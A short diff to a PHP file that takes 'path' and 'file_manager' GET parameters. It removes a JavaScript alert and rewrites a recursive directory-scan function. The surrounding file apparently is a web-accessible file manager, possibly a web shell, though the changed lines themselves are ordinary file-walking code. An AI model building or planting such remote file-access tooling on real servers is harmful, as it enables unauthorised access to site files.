@@ -1011,7 +1011,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             xhr.onreadystatechange = function() {
                 if (this.responseText !== "" && this.readyState == 4) 
                 {
-                     alert(this.responseText);
+                     
                      ';
                      echo "
                      if (ubahtitle) {
@@ -1771,14 +1771,20 @@ function path() {
     }
     return $dir;
 }
-function dir_scan($folder) {
-    $files = glob($folder);
-    foreach ($files as $f) {
-        if (is_dir($f)) {
-            $files = array_merge($files, dir_scan($f.'/*')); // scan subfolder
+function dir_scan($dir, &$results = array()) {
+    $files = scandir($dir);
+
+    foreach ($files as $key => $value) {
+        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
+        if (!is_dir($path)) {
+            $results[] = $path;
+        } else if ($value != "." && $value != "..") {
+            dir_scan($path, $results);
+            $results[] = $path;
         }
     }
-    return $files;
+
+    return $results;
 }
 function xcopy($src, $dest) {
     foreach (scandir($src) as $file) {
